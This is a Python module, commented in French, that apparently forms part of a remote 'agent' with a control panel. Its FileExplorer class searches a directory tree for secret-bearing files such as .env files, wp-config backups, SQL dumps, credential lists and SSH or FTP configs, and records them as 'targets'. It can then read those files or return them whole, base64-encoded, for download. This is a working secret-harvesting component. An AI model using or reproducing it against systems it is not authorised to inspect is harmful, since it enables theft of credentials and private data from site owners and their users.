import os
import re
import json
import base64
import datetime # Importe datetime pour les timestamps des logs

# Simuler l'import du Logger de l'agent pour que les modules puissent logger directement.
# En production, ce serait l'instance réelle du logger.
# Ici, pour les tests autonomes des modules, on utilise un logger simple.
# --- DEBUT MODIFICATION ---
_LOGGER = None # Initialisé à None, car il sera patché par control_panel.py
try:
    # Tente d'importer la classe Logger réelle de l'agent
    from modules.logger import Logger as AgentLogger
    # Si AgentLogger est importé, on l'utilisera si le _LOGGER n'est pas déjà patché
    _LOGGER = AgentLogger(None, None, debug_mode=True) # Fallback pour les tests autonomes
except ImportError:
    pass # Sera géré si _LOGGER reste None

# MockLogger simple pour le cas où modules.logger.Logger n'est pas disponible ET n'est pas patché
class FallbackMockLogger:
    def log_debug(self, msg): print(f"[Fallback DEBUG] {msg}")
    def log_info(self, msg): print(f"[Fallback INFO] {msg}")
    def log_warning(self, msg): print(f"[Fallback WARNING] {msg}")
    def log_error(self, msg): print(f"[Fallback ERROR] {msg}")
    def log_critical(self, msg): print(f"[Fallback CRITICAL] {msg}")
    def get_new_logs(self, last_log_index: int = 0) -> tuple[list[str], int]: return [], 0
    def reset_logs(self): pass

# Assurez-vous que _LOGGER est une instance de logger, même si modules.logger n'est pas là
if _LOGGER is None:
    _LOGGER = FallbackMockLogger()
    print("[WARNING] modules.logger.Logger non trouvé ou non initialisé. Utilisation de FallbackMockLogger dans FileExplorer.")

# --- FIN MODIFICATION ---


class FileExplorer:
    TARGET_TYPE_FILE = "file"
    TARGET_TYPE_DIRECTORY = "directory"

    def __init__(self, debug_mode: bool = False):
        self.debug_mode = debug_mode
        self.found_targets = []
        self.sensitive_regex_patterns = [
            r'\.sql(?:\.zip|\.gz|\.bz2|\.rar|\.7z)?$',
            r'backup(?:s)?\.(?:zip|tar\.gz|tgz|rar|7z|sql)$',
            r'(?:wp|wordpress|site|db)_dump_?\d{8}(?:_\d{6})?\.sql(?:(?:\.zip|\.gz|\.bz2)?)$',
            r'(?:private|confidential|secret|internal|users|clients|passwords|creds|credentials|key)s?\.(?:pdf|doc|docx|xls|xlsx|csv|txt|ini|json|log)$',
            r'(?:debug|error|access|application|php)\.log(?:\.\d+)?$',
            r'\.env(?:\.sample)?$',
            r'wp-config-backup(?:s)?\.php$',
            r'(?:config|settings|ftp|ssh)\.(?:json|ini|txt|yml|yaml)$',
            r'(?:backups|private|secrets|exports|temp|tmp)(?:\/|\\|_)'
        ]
        self.compiled_patterns = [re.compile(p, re.IGNORECASE) for p in self.sensitive_regex_patterns]
        self.exclude_dirs = [
            'node_modules', '.git', '.svn', '__pycache__', 'vendor',
            'wp-admin', 'wp-includes'
        ]
        self.base_path = "" # Initialisé ici pour éviter une erreur si _get_readable_path est appelé avant explore_path

        # --- DEBUT MODIFICATION ---
        # S'assurer que le logger de l'instance est bien le logger global défini dans control_panel.py
        # Normalement, control_panel.py patchera déjà FileExplorer._LOGGER
        # Mais pour la sécurité, on utilise aussi l'instance globale si ce module est lancé seul.
        global _LOGGER # Déclare qu'on utilise le _LOGGER global de ce module
        self._LOGGER = _LOGGER
        self._LOGGER.log_info(f"[FileExplorer] Initialisé (Debug Mode: {debug_mode}).")
        # --- FIN MODIFICATION ---

    def _log_debug(self, message: str):
        if self.debug_mode:
            self._LOGGER.log_debug(f"[FileExplorer] {message}") # Utilise self._LOGGER

    def _is_sensitive(self, name: str) -> str | None:
        for pattern_obj in self.compiled_patterns:
            if pattern_obj.search(name):
                return pattern_obj.pattern
        return None

    def _get_readable_path(self, path: str) -> str:
        # S'assurer que base_path est défini avant d'essayer de l'utiliser
        if hasattr(self, 'base_path') and path.startswith(self.base_path):
            return os.path.relpath(path, self.base_path)
        return path

    def explore_path(self, base_path: str, max_depth: int = 3):
        self.base_path = base_path
        self.found_targets = []
        self._LOGGER.log_info(f"[FileExplorer] Début de l'exploration locale de '{base_path}' jusqu'à une profondeur de {max_depth}.") # Utilise self._LOGGER

        if not os.path.exists(base_path):
            self._LOGGER.log_error(f"[FileExplorer] Le chemin de base '{base_path}' n'existe pas.") # Utilise self._LOGGER
            return []
        if not os.path.isdir(base_path):
            self._LOGGER.log_error(f"[FileExplorer] Le chemin de base '{base_path}' n'est pas un répertoire.") # Utilise self._LOGGER
            return []


        for root, dirs, files in os.walk(base_path):
            current_depth = root.count(os.sep) - base_path.count(os.sep)
            if current_depth > max_depth:
                dirs[:] = [] # Empêche os.walk de descendre plus loin dans ces sous-répertoires
                continue

            # Exclure les répertoires spécifiés avant de les parcourir
            # Logique pour exclure des répertoires comme 'node_modules', '.git'
            dirs_to_keep = []
            for d in dirs:
                if d in self.exclude_dirs:
                    self._log_debug(f"Exclusion du répertoire : {os.path.join(root, d)}")
                else:
                    dirs_to_keep.append(d)
            dirs[:] = dirs_to_keep


            # Vérifier le répertoire courant lui-même pour des motifs sensibles (nom de dossier)
            sensitive_match = self._is_sensitive(os.path.basename(root))
            if sensitive_match:
                self.found_targets.append({
                    'path': self._get_readable_path(root),
                    'full_path': root,
                    'type': self.TARGET_TYPE_DIRECTORY,
                    'sensitive_match': sensitive_match
                })
                self._LOGGER.log_warning(f"[FileExplorer] Dossier sensible trouvé: {self._get_readable_path(root)} (Match: {sensitive_match})") # Utilise self._LOGGER


            # Vérifier les fichiers dans le répertoire courant
            for file_name in files:
                sensitive_match = self._is_sensitive(file_name)
                if sensitive_match:
                    full_file_path = os.path.join(root, file_name)
                    self.found_targets.append({
                        'path': self._get_readable_path(full_file_path),
                        'full_path': full_file_path,
                        'type': self.TARGET_TYPE_FILE,
                        'sensitive_match': sensitive_match
                    })
                    self._LOGGER.log_warning(f"[FileExplorer] Fichier sensible trouvé: {self._get_readable_path(full_file_path)} (Match: {sensitive_match})") # Utilise self._LOGGER
                else:
                    self._log_debug(f"Fichier non sensible: {self._get_readable_path(os.path.join(root, file_name))}")


        self._LOGGER.log_info(f"[FileExplorer] Exploration locale terminée. {len(self.found_targets)} cibles trouvées.") # Utilise self._LOGGER
        return self.found_targets

    def read_file_content(self, target_full_path: str, max_bytes: int = 10240) -> str:
        self._LOGGER.log_debug(f"[FileExplorer] Lecture du contenu de: {target_full_path}") # Utilise self._LOGGER
        if not os.path.exists(target_full_path) or not os.path.isfile(target_full_path):
            self._LOGGER.log_error(f"[FileExplorer] Chemin de fichier invalide ou inexistant: {target_full_path}") # Utilise self._LOGGER
            return "[ERREUR] Le chemin spécifié n'existe pas ou n'est pas un fichier."

        try:
            with open(target_full_path, 'rb') as f:
                content_bytes = f.read(max_bytes)
                decoded_content = content_bytes.decode('utf-8', errors='replace')

                if f.read(1):
                    decoded_content += "\n[... Contenu tronqué, lire le fichier complet pour voir la suite ...]"

                return decoded_content
        except PermissionError:
            self._LOGGER.log_error(f"[FileExplorer] Permission refusée pour lire: {target_full_path}") # Utilise self._LOGGER
            return "[ERREUR] Permission refusée pour lire ce fichier."
        except Exception as e:
            self._LOGGER.log_error(f"[FileExplorer] Erreur inattendue lors de la lecture de {target_full_path}: {e}") # Utilise self._LOGGER
            return f"[ERREUR] Impossible de lire le fichier: {e}"

    def download_file_base64(self, target_full_path: str) -> str:
        self._LOGGER.log_debug(f"[FileExplorer] Téléchargement de (Base64): {target_full_path}") # Utilise self._LOGGER
        if not os.path.exists(target_full_path) or not os.path.isfile(target_full_path):
            self._LOGGER.log_error(f"[FileExplorer] Chemin de fichier invalide ou inexistant pour téléchargement: {target_full_path}") # Utilise self._LOGGER
            return "[ERREUR] Le chemin spécifié n'existe pas ou n'est pas un fichier."

        try:
            with open(target_full_path, 'rb') as f:
                file_content = f.read()
            return base64.b64encode(file_content).decode('utf-8')
        except PermissionError:
            self._LOGGER.log_error(f"[FileExplorer] Permission refusée pour télécharger: {target_full_path}") # Utilise self._LOGGER
            return "[ERREUR] Permission refusée pour télécharger ce fichier."
        except Exception as e:
            self._LOGGER.log_error(f"[FileExplorer] Erreur inattendue lors du téléchargement de {target_full_path}: {e}") # Utilise self._LOGGER
            return f"[ERREUR] Impossible de lire le fichier pour le téléchargement: {e}"

    def get_found_targets(self) -> list:
        return self.found_targets

    # --- DEBUT MODIFICATION : Suppression de get_explorer_logs, car control_panel.py interroge directement _GLOBAL_MODULE_LOGGER ---
    # def get_explorer_logs(self, last_index: int = 0) -> tuple[list[str], int]:
    #    """
    #    Récupère les logs du logger.
    #    Utile pour l'affichage en temps réel dans une interface utilisateur.
    #    Retourne une liste des nouveaux logs et le nouvel index total.
    #    """
    #    if isinstance(self._LOGGER, MockLogger): # Ici, self._LOGGER est _GLOBAL_MODULE_LOGGER
    #        return self._LOGGER.get_new_logs(last_index)
    #    else:
    #        # Si le logger réel est utilisé, cette fonction ne peut pas récupérer les logs en mémoire
    #        # Il faudrait que le logger réel expose une méthode similaire ou écrive dans un fichier lisible.
    #        self._LOGGER.log_warning("[FileExplorer] Impossible de récupérer les logs en mémoire avec le logger réel. Se référer aux fichiers de log.")
    #        return [], last_index # Retourne une liste vide et le même index
    # --- FIN MODIFICATION ---

    def reset_state(self):
        self.found_targets = []
        self._LOGGER.log_info("[FileExplorer] État réinitialisé.") # Utilise self._LOGGER

# --- Bloc de test (inchangé, mais notera que get_explorer_logs n'est plus une méthode de FileExplorer) ---
if __name__ == "__main__":
    print("[+] Test du module FileExplorer (mode complet)...")
    # Pour tester la récupération des logs, vous pouvez ajouter ceci:
    file_explorer = FileExplorer(debug_mode=True)

    # Créer un répertoire temporaire pour le test
    test_dir = "temp_test_dir_for_file_explorer"
    os.makedirs(test_dir, exist_ok=True)
    with open(os.path.join(test_dir, "sensitive.log"), "w") as f:
        f.write("Ceci est un log sensible.")
    with open(os.path.join(test_dir, "normal.txt"), "w") as f:
        f.write("Ceci est un fichier normal.")
    os.makedirs(os.path.join(test_dir, "wp-content", "backups"), exist_ok=True) # Test répertoire sensible

    print("\n--- Exécution de l'exploration pour générer des logs ---")
    file_explorer.explore_path(test_dir)

    print("\n--- Récupération des logs (via le logger global) ---")
    # Pour le test unitaire, si _LOGGER est FallbackMockLogger, il contient les logs
    # Si c'est AgentLogger, il faudra qu'il ait une méthode get_new_logs implémentée (voir modules/logger.py)
    all_current_logs, total_logs_count = _LOGGER.get_new_logs() # Interroge directement _LOGGER
    for log in all_current_logs:
        print(f"LOG: {log}")
    print(f"Total de logs collectés: {total_logs_count}")

    # Simuler une deuxième récupération pour voir les "nouveaux" logs
    print("\n--- Récupération des nouveaux logs (après un certain temps/action) ---")
    # Ajoutons un nouveau log pour voir si get_new_logs fonctionne
    _LOGGER.log_info("[FileExplorer] Un nouveau message de log après l'exploration.")
    _LOGGER.log_warning("[FileExplorer] Attention: un autre événement s'est produit.")

    new_logs, new_total_count = _LOGGER.get_new_logs(total_logs_count) # total_logs_count est l'index de départ
    print(f"Nouveaux logs depuis l'index {total_logs_count}:")
    for log in new_logs:
        print(f"NOUVEAU LOG: {log}")
    print(f"Nouveau total de logs: {new_total_count}")


    # Nettoyage
    os.remove(os.path.join(test_dir, "sensitive.log"))
    os.remove(os.path.join(test_dir, "normal.txt"))
    os.rmdir(os.path.join(test_dir, "wp-content", "backups")) # Nettoyer le sous-dossier
    os.rmdir(os.path.join(test_dir, "wp-content"))
    os.rmdir(test_dir)
    print("\n[+] Test de FileExplorer terminé.")

